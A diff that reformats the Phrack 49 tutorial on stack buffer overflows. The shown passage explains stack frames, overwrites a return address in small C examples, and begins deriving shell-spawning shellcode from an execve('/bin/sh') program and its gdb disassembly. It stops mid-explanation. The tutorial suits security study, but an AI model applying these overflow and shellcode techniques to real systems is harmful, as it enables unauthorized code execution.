@@ -1,5 +1,6 @@
  http://phrack.org/issues/49/14.html
- 
+
+-->  
  .oO Phrack 49 Oo.
 
                           Volume Seven, Issue Forty-Nine
@@ -27,52 +28,42 @@
     never done intentionally. See spam; see also alias bug,
     fandango on core, memory leak, precedence lossage, overrun screw.
 
+--> Introduction
+ Over the last few months there has been a large increase of buffer overflow vulnera-
+ bilities being both discovered and exploited. Examples of these are syslog, splitvt, 
+ sendmail 8.7.5, Linux/FreeBSD mount, Xt library, at, etc.  This paper attempts to e-
+ xplain what buffer overflows  are, and how their exploits work.
 
-                                 Introduction
-                                 ~~~~~~~~~~~~
+ Basic knowledge of assembly is required. An understanding of virtual memory concept-
+ s, and experience with gdb are very helpful but not necessary. We also assume we are 
+ working with an Intel x86 CPU, and that the operating system is Linux.
 
-   Over the last few months there has been a large increase of buffer
-overflow vulnerabilities being both discovered and exploited.  Examples
-of these are syslog, splitvt, sendmail 8.7.5, Linux/FreeBSD mount, Xt 
-library, at, etc.  This paper attempts to explain what buffer overflows 
-are, and how their exploits work.
+ Some basic definitions before we begin: A buffer is simply a contiguous block of co-
+ mputer memory that holds multiple instances of the same data type. C programmers no-
+ rmally associate with the word buffer arrays. Most commonly, character arrays. Arra-
+ ys, like all variables in C, can be declared either static or dynamic. Static varia-
+ bles are allocated at load time on the data segment. Dynamic variables are allocated 
+ at run time on the stack. To overflow is to flow, or fill over the top, brims, or b-
+ ounds. We will concern ourselves only with the overflow of dynamic buffers, otherwi-
+ se known as stack-based buffer overflows.
 
-   Basic knowledge of assembly is required.  An understanding of virtual 
-memory concepts, and experience with gdb are very helpful but not necessary.
-We also assume we are working with an Intel x86 CPU, and that the operating 
-system is Linux.
+--> Process Memory Organization
+ To understand what stack buffers are we must first understand how a process is orga-
+ nized in memory. Processes are divided into three regions: Text, Data, and Stack. We 
+ will concentrate on the stack region, but first a small overview of the other regio-
+ ns is in order.
 
-   Some basic definitions before we begin: A buffer is simply a contiguous 
-block of computer memory that holds multiple instances of the same data 
-type.  C programmers normally associate with the word buffer arrays. Most 
-commonly, character arrays.  Arrays, like all variables in C, can be 
-declared either static or dynamic.  Static variables are allocated at load 
-time on the data segment.  Dynamic variables are allocated at run time on 
-the stack. To overflow is to flow, or fill over the top, brims, or bounds. 
-We will concern ourselves only with the overflow of dynamic buffers, otherwise
-known as stack-based buffer overflows.
+ The text region is fixed by the program and includes code (instructions) and       -
+ read-only data. This region corresponds to the text section of the executable  file.  
+ This region is normally marked read-only and any attempt to write to it will  result 
+ in a segmentation violation.
 
-
-                          Process Memory Organization
-                          ~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-   To understand what stack buffers are we must first understand how a
-process is organized in memory.  Processes are divided into three regions:
-Text, Data, and Stack.  We will concentrate on the stack region, but first
-a small overview of the other regions is in order.
-
-   The text region is fixed by the program and includes code (instructions)
-and read-only data.  This region corresponds to the text section of the
-executable file.  This region is normally marked read-only and any attempt to
-write to it will result in a segmentation violation.
-
-   The data region contains initialized and uninitialized data.  Static
-variables are stored in this region.  The data region corresponds to the
-data-bss sections of the executable file.  Its size can be changed with the
-brk(2) system call.  If the expansion of the bss data or the user stack
-exhausts available memory, the process is blocked and is rescheduled to
-run again with a larger memory space. New memory is added between the data
-and stack segments.
+ The data region contains initialized and uninitialized data. Static variables are s-
+ tored in this region. The data region corresponds to the data-bss sections of the e-
+ xecutable file. Its size can be changed with the brk(2) system call. If the expansi-
+ on of the bss data or the user stack exhausts available memory, the process is bloc-
+ ked and is rescheduled to run again with a larger memory space. New memory is  added 
+ between the data and stack segments.
 
                              /------------------\  lower
                              |                  |  memory
@@ -90,553 +81,508 @@ and stack segments.
 
                          Fig. 1 Process Memory Regions
 
+--> What Is A Stack?
+ A stack is an abstract data type frequently used in computer science. A stack of ob-
+ jects has the property that the last object placed on the stack will be the first o-
+ bject removed. This property is commonly referred to as last in, first out queue, or 
+ a LIFO.
 
-                               What Is A Stack?
-                               ~~~~~~~~~~~~~~~~
+ Several operations are defined on stacks. Two of the most important are PUSH and   -
+ POP. PUSH adds an element at the top of the stack. POP, in contrast, reduces the st-
+ ack size by one by removing the last element at the top of the stack.
 
-   A stack is an abstract data type frequently used in computer science.  A
-stack of objects has the property that the last object placed on the stack
-will be the first object removed.  This property is commonly referred to as
-last in, first out queue, or a LIFO.
+--> Why Do We Use A Stack?
+ Modern computers are designed with the need of high-level languages in mind. The mo-
+ st important technique for structuring programs introduced by high-level languages -
+ is the procedure or function. From one point of view, a procedure call alters the f-
+ low of control just as a jump does, but unlike a jump, when finished performing  its 
+ task, a function returns control to the statement or instruction following the call.  
+ This high-level abstraction is implemented with the help of the stack.
 
-   Several operations are defined on stacks.  Two of the most important are
-PUSH and POP.  PUSH adds an element at the top of the stack.  POP, in 
-contrast, reduces the stack size by one by removing the last element at the 
-top of the stack.
+ The stack is also used to dynamically allocate the local variables used in function-
+ s, to pass parameters to the functions, and to return values from the function.
 
+--> The Stack Region
+ A stack is a contiguous block of memory containing data. A register called the stac-
+ k pointer (SP) points to the top of the stack. The bottom of the stack is at a fixed 
+ address. Its size is dynamically adjusted by the kernel at run time. The CPU implem-
+ ents instructions to PUSH onto and POP off of the  stack. 
 
-                            Why Do We Use A Stack?
-                            ~~~~~~~~~~~~~~~~~~~~~~
+ The stack consists of logical stack frames that are pushed when calling a function -
+ and popped when returning. A stack frame contains the parameters to a function,  its 
+ local variables, and the data necessary to recover the previous stack frame, includ-
+ ing the value of the instruction pointer at the time of the function call.
 
-   Modern computers are designed with the need of high-level languages in
-mind.  The most important technique for structuring programs introduced by
-high-level languages is the procedure or function.  From one point of view, a
-procedure call alters the flow of control just as a jump does, but unlike a
-jump, when finished performing its task, a function returns control to the 
-statement or instruction following the call.  This high-level abstraction
-is implemented with the help of the stack.
+ Depending on the implementation the stack will either grow down (towards lower memo-
+ ry addresses), or up. In our examples we'll use a stack that grows down. This is the 
+ way the stack grows on many computers including the Intel, Motorola, SPARC and  MIPS 
+ processors. The stack pointer (SP) is also implementation dependent. It may point to 
+ the last address on the stack, or to the next free available address after the stac-
+ k. For our discussion we'll assume it points to the last address on the stack.
 
-  The stack is also used to dynamically allocate the local variables used in
-functions, to pass parameters to the functions, and to return values from the
-function.
+ In addition to the stack pointer, which points to the top of the stack (lowest nume-
+ rical address), it is often convenient to have a frame pointer (FP) which points  to 
+ a fixed location within a frame. Some texts also refer to it as a local base pointer 
+ (LB). In principle, local variables could be referenced by giving their offsets from 
+ SP. However, as words are pushed onto the stack and popped from the stack, these of-
+ fsets change. Although in some cases the compiler can keep track of the number of w-
+ ords on the stack and thus correct the offsets, in some cases it cannot, and in  all 
+ cases considerable administration is required. Futhermore, on some machines, such as 
+ Intel-based processors, accessing a variable at a known distance from SP requires m-
+ ultiple instructions.
 
+ Consequently, many compilers use a second register, FP, for referencing both local -
+ variables and parameters because their distances from FP do not change with PUSHes -
+ and POPs. On Intel CPUs, BP (EBP) is used for this purpose. On the Motorola CPUs, a-
+ ny address register except A7 (the stack pointer) will do. Because the way our stack 
+ grows, actual parameters have positive offsets and local variables have negative of-
+ fsets from FP.
 
-                               The Stack Region
-                               ~~~~~~~~~~~~~~~~
+ The first thing a procedure must do when called is save the previous FP (so it can -
+ be restored at procedure exit). Then it copies SP into FP to create the new FP,  and 
+ advances SP to reserve space for the local variables. This code is called the proce-
+ dure prolog. Upon procedure exit, the stack must be cleaned up again, something cal-
+ led the procedure epilog. The Intel ENTER and LEAVE instructions and the Motorola  -
+ LINK and UNLINK instructions, have been provided to do most of the procedure  prolog 
+ and epilog work efficiently. 
 
-   A stack is a contiguous block of memory containing data.  A register called
-the stack pointer (SP) points to the top of the stack.  The bottom of the 
-stack is at a fixed address.  Its size is dynamically adjusted by the kernel 
-at run time. The CPU implements instructions to PUSH onto and POP off of the 
-stack. 
+ Let us see what the stack looks like in a simple example:
 
-   The stack consists of logical stack frames that are pushed when calling a
-function and popped when returning.  A stack frame contains the parameters to 
-a function, its local variables, and the data necessary to recover the 
-previous stack frame, including the value of the instruction pointer at the 
-time of the function call.
+ example1.c:
+ ------------------------------------------------------------------------------
+ void function(int a, int b, int c) {
+    char buffer1[5];
+    char buffer2[10];
+ }
 
-   Depending on the implementation the stack will either grow down (towards
-lower memory addresses), or up.  In our examples we'll use a stack that grows
-down.  This is the way the stack grows on many computers including the Intel, 
-Motorola, SPARC and MIPS processors.  The stack pointer (SP) is also
-implementation dependent.  It may point to the last address on the stack, or 
-to the next free available address after the stack.  For our discussion we'll
-assume it points to the last address on the stack.
+ void main() {
+   function(1,2,3);
+ }
+ ------------------------------------------------------------------------------
 
-   In addition to the stack pointer, which points to the top of the stack
-(lowest numerical address), it is often convenient to have a frame pointer
-(FP) which points to a fixed location within a frame.  Some texts also refer
-to it as a local base pointer (LB).  In principle, local variables could be
-referenced by giving their offsets from SP.  However, as words are pushed onto
-the stack and popped from the stack, these offsets change.  Although in some
-cases the compiler can keep track of the number of words on the stack and
-thus correct the offsets, in some cases it cannot, and in all cases
-considerable administration is required.  Futhermore, on some machines, such
-as Intel-based processors, accessing a variable at a known distance from SP
-requires multiple instructions.
+ To understand what the program does to call function() we compile it with gcc  using 
+ the -S switch to generate assembly code output:
 
-   Consequently, many compilers use a second register, FP, for referencing
-both local variables and parameters because their distances from FP do
-not change with PUSHes and POPs.  On Intel CPUs, BP (EBP) is used for this 
-purpose.  On the Motorola CPUs, any address register except A7 (the stack 
-pointer) will do.  Because the way our stack grows, actual parameters have 
-positive offsets and local variables have negative offsets from FP.
+ $ gcc -S -o example1.s example1.c
 
-   The first thing a procedure must do when called is save the previous FP
-(so it can be restored at procedure exit).  Then it copies SP into FP to 
-create the new FP, and advances SP to reserve space for the local variables. 
-This code is called the procedure prolog.  Upon procedure exit, the stack 
-must be cleaned up again, something called the procedure epilog.  The Intel 
-ENTER and LEAVE instructions and the Motorola LINK and UNLINK instructions, 
-have been provided to do most of the procedure prolog and epilog work 
-efficiently. 
-
-   Let us see what the stack looks like in a simple example:
-
-example1.c:
-------------------------------------------------------------------------------
-void function(int a, int b, int c) {
-   char buffer1[5];
-   char buffer2[10];
-}
-
-void main() {
-  function(1,2,3);
-}
-------------------------------------------------------------------------------
-
-   To understand what the program does to call function() we compile it with
-gcc using the -S switch to generate assembly code output:
-
-$ gcc -S -o example1.s example1.c
-
-   By looking at the assembly language output we see that the call to
-function() is translated to:
-
+ By looking at the assembly language output we see that the call to function() is tr-
+ anslated to:
         pushl $3
         pushl $2
         pushl $1
         call function
-
-    This pushes the 3 arguments to function backwards into the stack, and
-calls function().  The instruction 'call' will push the instruction pointer
-(IP) onto the stack.  We'll call the saved IP the return address (RET).  The
-first thing done in function is the procedure prolog:
-
+ This pushes the 3 arguments to function backwards into the stack, and calls        -
+ function(). The instruction 'call' will push the instruction pointer(IP) onto the s-
+ tack. We'll call the saved IP the return address (RET). The first thing done in fun-
+ ction is the procedure prolog:
         pushl %ebp
         movl %esp,%ebp
         subl $20,%esp
+ This pushes EBP, the frame pointer, onto the stack. It then copies the current SP o-
+ nto EBP, making it the new FP pointer. We'll call the saved FP pointer SFP. It  then 
+ allocates space for the local variables by subtracting their size from SP.
 
-   This pushes EBP, the frame pointer, onto the stack.  It then copies the
-current SP onto EBP, making it the new FP pointer.  We'll call the saved FP
-pointer SFP.  It then allocates space for the local variables by subtracting
-their size from SP.
+ We must remember that memory can only be addressed in multiples of the word size.  A 
+ word in our case is 4 bytes, or 32 bits. So our 5 byte buffer is really going to ta-
+ ke 8 bytes (2 words) of memory, and our 10 byte buffer is going to take 12 bytes ( 3 
+ words) of memory. That is why SP is being subtracted by 20. With that in mind our s-
+ tack looks like this when function() is called (each space represents a byte):
 
-   We must remember that memory can only be addressed in multiples of the
-word size.  A word in our case is 4 bytes, or 32 bits.  So our 5 byte buffer
-is really going to take 8 bytes (2 words) of memory, and our 10 byte buffer
-is going to take 12 bytes (3 words) of memory.  That is why SP is being
-subtracted by 20.  With that in mind our stack looks like this when
-function() is called (each space represents a byte):
+ bottom of                                                            top of
+ memory                                                               memory
+            buffer2       buffer1   sfp   ret   a     b     c
+ <------   [            ][        ][    ][    ][    ][    ][    ]
+        
+ top of                                                            bottom of
+ stack                                                                 stack
 
+--> Buffer Overflows
+ A buffer overflow is the result of stuffing more data into a buffer than it can han-
+ dle. How can this often found programming error can be taken advantage to execute a-
+ rbitrary code? Lets look at another example:
 
-bottom of                                                            top of
-memory                                                               memory
-           buffer2       buffer1   sfp   ret   a     b     c
-<------   [            ][        ][    ][    ][    ][    ][    ]
-       
-top of                                                            bottom of
-stack                                                                 stack
+ example2.c
+ ------------------------------------------------------------------------------
+ void function(char *str) {
+    char buffer[16]; 
+ 
+    strcpy(buffer,str);
+ }
 
+ void main() {
+   char large_string[256];
+   int i;
 
-                               Buffer Overflows
-                               ~~~~~~~~~~~~~~~~
+   for( i = 0; i < 255; i++)
+     large_string[i] = 'A';
 
-   A buffer overflow is the result of stuffing more data into a buffer than
-it can handle.  How can this often found programming error can be taken
-advantage to execute arbitrary code?  Lets look at another example:
+   function(large_string);
+ }
+ ------------------------------------------------------------------------------
 
-example2.c
-------------------------------------------------------------------------------
-void function(char *str) {
-   char buffer[16];
+ This is program has a function with a typical buffer overflow coding error. The fun-
+ ction copies a supplied string without bounds checking by using strcpy() instead  of 
+ strncpy(). If you run this program you will get a segmentation violation. Lets see -
+ what its stack looks when we call function:
 
-   strcpy(buffer,str);
-}
+ bottom of                                                            top of
+ memory                                                               memory
+                   buffer            sfp   ret   *str
+ <------          [                ][    ][    ][    ] 
+ 
+ top of                                                            bottom of
+ stack                                                                 stack
 
-void main() {
-  char large_string[256];
-  int i;
+ What is going on here? Why do we get a segmentation violation? Simple. strcpy() is -
+ coping the contents of *str (larger_string[]) into buffer[] until a null character -
+ is found on the string. As we can see buffer[] is much smaller than *str. buffer[] -
+ is 16 bytes long, and we are trying to stuff it with 256 bytes. This means that  all 
+ 250 bytes after buffer in the stack are being overwritten. This includes the SFP,  -
+ RET, and even *str! We had filled large_string with the character 'A'. It's hex cha-
+ racter value is 0x41. That means that the return address is now 0x41414141. This  is
+ outside of the process address space. That is why when the function returns and tri-
+ es to read the next instruction from that address you get a  segmentation violation.
 
-  for( i = 0; i < 255; i++)
-    large_string[i] = 'A';
+ So a buffer overflow allows us to change the return address of a function. In this -
+ way we can change the flow of execution of the program. Lets go back to our first e-
+ xample and recall what the stack looked like:
 
-  function(large_string);
-}
-------------------------------------------------------------------------------
+ bottom of                                                            top of
+ memory                                                               memory
+            buffer2       buffer1   sfp   ret   a     b     c
+ <------   [            ][        ][    ][    ][    ][    ][    ]
+ 
+ top of                                                            bottom of
+ stack                                                                 stack
 
-   This is program has a function with a typical buffer overflow coding
-error.  The function copies a supplied string without bounds checking by
-using strcpy() instead of strncpy().  If you run this program you will get a
-segmentation violation.  Lets see what its stack looks when we call function:
+ Lets try to modify our first example so that it overwrites the return address, and -
+ demonstrate how we can make it execute arbitrary code. Just before buffer1[] on  the 
+ stack is SFP, and before it, the return address. That is 4 bytes pass the end of   -
+ buffer1[]. But remember that buffer1[] is really 2 word so its 8 bytes long. So  the 
+ return address is 12 bytes from the start of buffer1[]. We'll modify the return val-
+ ue in such a way that the assignment statement 'x = 1;' after the function call will 
+ be jumped. To do so we add 8 bytes to the return address. Our code is now:
 
+ example3.c:
+ ------------------------------------------------------------------------------
+ void function(int a, int b, int c) {
+    char buffer1[5];
+    char buffer2[10];
+    int *ret;
 
-bottom of                                                            top of
-memory                                                               memory
-                  buffer            sfp   ret   *str
-<------          [                ][    ][    ][    ]
+    ret = buffer1 + 12;
+    (*ret) += 8;
+ }
 
-top of                                                            bottom of
-stack                                                                 stack
+ void main() {
+   int x;
 
+   x = 0;
+   function(1,2,3);
+   x = 1;
+   printf("%d\n",x);
+ }
+ ------------------------------------------------------------------------------
 
-   What is going on here?  Why do we get a segmentation violation?  Simple.
-strcpy() is coping the contents of *str (larger_string[]) into buffer[]
-until a null character is found on the string.  As we can see buffer[] is
-much smaller than *str.  buffer[] is 16 bytes long, and we are trying to stuff
-it with 256 bytes.  This means that all 250 bytes after buffer in the stack
-are being overwritten.  This includes the SFP, RET, and even *str!  We had 
-filled large_string with the character 'A'.  It's hex character value
-is 0x41.  That means that the return address is now 0x41414141.  This is
-outside of the process address space.  That is why when the function returns
-and tries to read the next instruction from that address you get a 
-segmentation violation.
-
-   So a buffer overflow allows us to change the return address of a function.
-In this way we can change the flow of execution of the program.  Lets go back
-to our first example and recall what the stack looked like:
-
-
-bottom of                                                            top of
-memory                                                               memory
-           buffer2       buffer1   sfp   ret   a     b     c
-<------   [            ][        ][    ][    ][    ][    ][    ]
-
-top of                                                            bottom of
-stack                                                                 stack
-
-
-   Lets try to modify our first example so that it overwrites the return
-address, and demonstrate how we can make it execute arbitrary code.  Just
-before buffer1[] on the stack is SFP, and before it, the return address.
-That is 4 bytes pass the end of buffer1[].  But remember that buffer1[] is
-really 2 word so its 8 bytes long.  So the return address is 12 bytes from
-the start of buffer1[].  We'll modify the return value in such a way that the
-assignment statement 'x = 1;' after the function call will be jumped.  To do
-so we add 8 bytes to the return address.  Our code is now:
-
-example3.c:
-------------------------------------------------------------------------------
-void function(int a, int b, int c) {
-   char buffer1[5];
-   char buffer2[10];
-   int *ret;
-
-   ret = buffer1 + 12;
-   (*ret) += 8;
-}
-
-void main() {
-  int x;
-
-  x = 0;
-  function(1,2,3);
-  x = 1;
-  printf("%d\n",x);
-}
-------------------------------------------------------------------------------
-
-   What we have done is add 12 to buffer1[]'s address.  This new address is
-where the return address is stored.  We want to skip pass the assignment to
-the printf call.  How did we know to add 8 to the return address?  We used a
-test value first (for example 1), compiled the program, and then started gdb:
-
-------------------------------------------------------------------------------
-[aleph1]$ gdb example3
-GDB is free software and you are welcome to distribute copies of it
+ What we have done is add 12 to buffer1[]'s address. This new address is where the r-
+ eturn address is stored. We want to skip pass the assignment to the printf call. How 
+ did we know to add 8 to the return address? We used a test value first (for  example 
+ 1), compiled the program, and then started gdb:
+ 
+ ------------------------------------------------------------------------------
+ [aleph1]$ gdb example3
+ GDB is free software and you are welcome to distribute copies of it
  under certain conditions; type "show copying" to see the conditions.
-There is absolutely no warranty for GDB; type "show warranty" for details.
-GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
-(no debugging symbols found)...
-(gdb) disassemble main
-Dump of assembler code for function main:
-0x8000490 <main>:       pushl  %ebp
-0x8000491 <main+1>:     movl   %esp,%ebp
-0x8000493 <main+3>:     subl   $0x4,%esp
-0x8000496 <main+6>:     movl   $0x0,0xfffffffc(%ebp)
-0x800049d <main+13>:    pushl  $0x3
-0x800049f <main+15>:    pushl  $0x2
-0x80004a1 <main+17>:    pushl  $0x1
-0x80004a3 <main+19>:    call   0x8000470 <function>
-0x80004a8 <main+24>:    addl   $0xc,%esp
-0x80004ab <main+27>:    movl   $0x1,0xfffffffc(%ebp)
-0x80004b2 <main+34>:    movl   0xfffffffc(%ebp),%eax
-0x80004b5 <main+37>:    pushl  %eax
-0x80004b6 <main+38>:    pushl  $0x80004f8
-0x80004bb <main+43>:    call   0x8000378 <printf>
-0x80004c0 <main+48>:    addl   $0x8,%esp
-0x80004c3 <main+51>:    movl   %ebp,%esp
-0x80004c5 <main+53>:    popl   %ebp
-0x80004c6 <main+54>:    ret
-0x80004c7 <main+55>:    nop
-------------------------------------------------------------------------------
+ There is absolutely no warranty for GDB; type "show warranty" for details.
+ GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+ (no debugging symbols found)...
+ (gdb) disassemble main
+ Dump of assembler code for function main:
+ 0x8000490 <main>:       pushl  %ebp
+ 0x8000491 <main+1>:     movl   %esp,%ebp
+ 0x8000493 <main+3>:     subl   $0x4,%esp
+ 0x8000496 <main+6>:     movl   $0x0,0xfffffffc(%ebp)
+ 0x800049d <main+13>:    pushl  $0x3
+ 0x800049f <main+15>:    pushl  $0x2
+ 0x80004a1 <main+17>:    pushl  $0x1
+ 0x80004a3 <main+19>:    call   0x8000470 <function>
+ 0x80004a8 <main+24>:    addl   $0xc,%esp
+ 0x80004ab <main+27>:    movl   $0x1,0xfffffffc(%ebp)
+ 0x80004b2 <main+34>:    movl   0xfffffffc(%ebp),%eax
+ 0x80004b5 <main+37>:    pushl  %eax
+ 0x80004b6 <main+38>:    pushl  $0x80004f8
+ 0x80004bb <main+43>:    call   0x8000378 <printf>
+ 0x80004c0 <main+48>:    addl   $0x8,%esp
+ 0x80004c3 <main+51>:    movl   %ebp,%esp
+ 0x80004c5 <main+53>:    popl   %ebp
+ 0x80004c6 <main+54>:    ret
+ 0x80004c7 <main+55>:    nop
+ ------------------------------------------------------------------------------
 
-   We can see that when calling function() the RET will be 0x8004a8, and we
-want to jump past the assignment at 0x80004ab.  The next instruction we want
-to execute is the at 0x8004b2.  A little math tells us the distance is 8
-bytes.
+ We can see that when calling function() the RET will be 0x8004a8, and we want to ju-
+ mp past the assignment at 0x80004ab. The next instruction we want to execute is  the 
+ at 0x8004b2.  A little math tells us the distance is 8 bytes.
 
+--> Shell Code
+ So now that we know that we can modify the return address and the flow of execution, 
+ what program do we want to execute? In most cases we'll simply want the program to -
+ spawn a shell. From the shell we can then issue other commands as we wish. But  what 
+ if there is no such code in the program we are trying to exploit? How can we place -
+ arbitrary instruction into its address space? The answer is to place the code with -
+ are trying to execute in the buffer we are overflowing, and overwrite the return ad-
+ dress so it points back into the buffer. Assuming the stack starts at address  0xFF, 
+ and that S stands for the code we want to execute the stack would then look like th-
+ is:
 
-                                  Shell Code
-                                  ~~~~~~~~~~
+ bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
+ memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
+            buffer                sfp   ret   a     b     c
 
-   So now that we know that we can modify the return address and the flow of
-execution, what program do we want to execute?  In most cases we'll simply
-want the program to spawn a shell.  From the shell we can then issue other
-commands as we wish.  But what if there is no such code in the program we
-are trying to exploit?  How can we place arbitrary instruction into its
-address space?  The answer is to place the code with are trying to execute in
-the buffer we are overflowing, and overwrite the return address so it points
-back into the buffer.  Assuming the stack starts at address 0xFF, and that S
-stands for the code we want to execute the stack would then look like this:
-
-
-bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
-memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
-           buffer                sfp   ret   a     b     c
-
-<------   [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]
-           ^                            |
-           |____________________________|
-top of                                                            bottom of
-stack                                                                 stack
+ <------   [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]
+            ^                            |
+            |____________________________|
+ top of                                                            bottom of
+ stack                                                                 stack
 
 
-The code to spawn a shell in C looks like:
+ The code to spawn a shell in C looks like:
 
-shellcode.c
------------------------------------------------------------------------------
-#include <stdio.h>
+ shellcode.c
+ -----------------------------------------------------------------------------
+ #include <stdio.h>
 
-void main() {
-   char *name[2];
+ void main() {
+    char *name[2];
 
-   name[0] = "/bin/sh";
-   name[1] = NULL;
-   execve(name[0], name, NULL);
-}
-------------------------------------------------------------------------------
+    name[0] = "/bin/sh";
+    name[1] = NULL;
+    execve(name[0], name, NULL);
+ }
+ ------------------------------------------------------------------------------
 
-   To find out what does it looks like in assembly we compile it, and start
-up gdb.  Remember to use the -static flag. Otherwise the actual code the
-for the execve system call will not be included.  Instead there will be a
-reference to dynamic C library that would normally would be linked in at
-load time.
+ To find out what does it looks like in assembly we compile it, and start up gdb. Re-
+ member to use the -static flag. Otherwise the actual code the for the execve  system 
+ call will not be included. Instead there will be a reference to dynamic C library t-
+ hat would normally would be linked in at load time.
 
-------------------------------------------------------------------------------
-[aleph1]$ gcc -o shellcode -ggdb -static shellcode.c
-[aleph1]$ gdb shellcode
-GDB is free software and you are welcome to distribute copies of it
+ ------------------------------------------------------------------------------
+ [aleph1]$ gcc -o shellcode -ggdb -static shellcode.c
+ [aleph1]$ gdb shellcode
+ GDB is free software and you are welcome to distribute copies of it
  under certain conditions; type "show copying" to see the conditions.
-There is absolutely no warranty for GDB; type "show warranty" for details.
-GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
-(gdb) disassemble main
-Dump of assembler code for function main:
-0x8000130 <main>:       pushl  %ebp
-0x8000131 <main+1>:     movl   %esp,%ebp
-0x8000133 <main+3>:     subl   $0x8,%esp
-0x8000136 <main+6>:     movl   $0x80027b8,0xfffffff8(%ebp)
-0x800013d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
-0x8000144 <main+20>:    pushl  $0x0
-0x8000146 <main+22>:    leal   0xfffffff8(%ebp),%eax
-0x8000149 <main+25>:    pushl  %eax
-0x800014a <main+26>:    movl   0xfffffff8(%ebp),%eax
-0x800014d <main+29>:    pushl  %eax
-0x800014e <main+30>:    call   0x80002bc <__execve>
-0x8000153 <main+35>:    addl   $0xc,%esp
-0x8000156 <main+38>:    movl   %ebp,%esp
-0x8000158 <main+40>:    popl   %ebp
-0x8000159 <main+41>:    ret
-End of assembler dump.
-(gdb) disassemble __execve
-Dump of assembler code for function __execve:
-0x80002bc <__execve>:           pushl  %ebp
-0x80002bd <__execve+1>:         movl   %esp,%ebp
-0x80002bf <__execve+3>:         pushl  %ebx
-0x80002c0 <__execve+4>:         movl   $0xb,%eax
-0x80002c5 <__execve+9>:         movl   0x8(%ebp),%ebx
-0x80002c8 <__execve+12>:        movl   0xc(%ebp),%ecx
-0x80002cb <__execve+15>:        movl   0x10(%ebp),%edx
-0x80002ce <__execve+18>:        int    $0x80
-0x80002d0 <__execve+20>:        movl   %eax,%edx
-0x80002d2 <__execve+22>:        testl  %edx,%edx
-0x80002d4 <__execve+24>:        jnl    0x80002e6 <__execve+42>
-0x80002d6 <__execve+26>:        negl   %edx
-0x80002d8 <__execve+28>:        pushl  %edx
-0x80002d9 <__execve+29>:        call   0x8001a34 <__normal_errno_location>
-0x80002de <__execve+34>:        popl   %edx
-0x80002df <__execve+35>:        movl   %edx,(%eax)
-0x80002e1 <__execve+37>:        movl   $0xffffffff,%eax
-0x80002e6 <__execve+42>:        popl   %ebx
-0x80002e7 <__execve+43>:        movl   %ebp,%esp
-0x80002e9 <__execve+45>:        popl   %ebp
-0x80002ea <__execve+46>:        ret
-0x80002eb <__execve+47>:        nop
-End of assembler dump.
-------------------------------------------------------------------------------
+ There is absolutely no warranty for GDB; type "show warranty" for details.
+ GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+ (gdb) disassemble main
+ Dump of assembler code for function main:
+ 0x8000130 <main>:       pushl  %ebp
+ 0x8000131 <main+1>:     movl   %esp,%ebp
+ 0x8000133 <main+3>:     subl   $0x8,%esp
+ 0x8000136 <main+6>:     movl   $0x80027b8,0xfffffff8(%ebp)
+ 0x800013d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+ 0x8000144 <main+20>:    pushl  $0x0
+ 0x8000146 <main+22>:    leal   0xfffffff8(%ebp),%eax
+ 0x8000149 <main+25>:    pushl  %eax
+ 0x800014a <main+26>:    movl   0xfffffff8(%ebp),%eax
+ 0x800014d <main+29>:    pushl  %eax
+ 0x800014e <main+30>:    call   0x80002bc <__execve>
+ 0x8000153 <main+35>:    addl   $0xc,%esp
+ 0x8000156 <main+38>:    movl   %ebp,%esp
+ 0x8000158 <main+40>:    popl   %ebp
+ 0x8000159 <main+41>:    ret
+ End of assembler dump.
+ (gdb) disassemble __execve
+ Dump of assembler code for function __execve:
+ 0x80002bc <__execve>:           pushl  %ebp
+ 0x80002bd <__execve+1>:         movl   %esp,%ebp
+ 0x80002bf <__execve+3>:         pushl  %ebx
+ 0x80002c0 <__execve+4>:         movl   $0xb,%eax
+ 0x80002c5 <__execve+9>:         movl   0x8(%ebp),%ebx
+ 0x80002c8 <__execve+12>:        movl   0xc(%ebp),%ecx
+ 0x80002cb <__execve+15>:        movl   0x10(%ebp),%edx
+ 0x80002ce <__execve+18>:        int    $0x80
+ 0x80002d0 <__execve+20>:        movl   %eax,%edx
+ 0x80002d2 <__execve+22>:        testl  %edx,%edx
+ 0x80002d4 <__execve+24>:        jnl    0x80002e6 <__execve+42>
+ 0x80002d6 <__execve+26>:        negl   %edx
+ 0x80002d8 <__execve+28>:        pushl  %edx
+ 0x80002d9 <__execve+29>:        call   0x8001a34 <__normal_errno_location>
+ 0x80002de <__execve+34>:        popl   %edx
+ 0x80002df <__execve+35>:        movl   %edx,(%eax)
+ 0x80002e1 <__execve+37>:        movl   $0xffffffff,%eax
+ 0x80002e6 <__execve+42>:        popl   %ebx
+ 0x80002e7 <__execve+43>:        movl   %ebp,%esp
+ 0x80002e9 <__execve+45>:        popl   %ebp
+ 0x80002ea <__execve+46>:        ret
+ 0x80002eb <__execve+47>:        nop
+ End of assembler dump.
+ ------------------------------------------------------------------------------
 
-Lets try to understand what is going on here. We'll start by studying main:
+ Lets try to understand what is going on here. We'll start by studying main:
 
-------------------------------------------------------------------------------
-0x8000130 <main>:       pushl  %ebp
-0x8000131 <main+1>:     movl   %esp,%ebp
-0x8000133 <main+3>:     subl   $0x8,%esp
+ ------------------------------------------------------------------------------
+ 0x8000130 <main>:       pushl  %ebp
+ 0x8000131 <main+1>:     movl   %esp,%ebp
+ 0x8000133 <main+3>:     subl   $0x8,%esp
 
-    This is the procedure prelude.  It first saves the old frame pointer,
-    makes the current stack pointer the new frame pointer, and leaves 
-    space for the local variables. In this case its:
+ This is the procedure prelude. It first saves the old frame pointer, makes the curr-
+ ent stack pointer the new frame pointer, and leaves space for the local variables. -
+ In this case its:
 
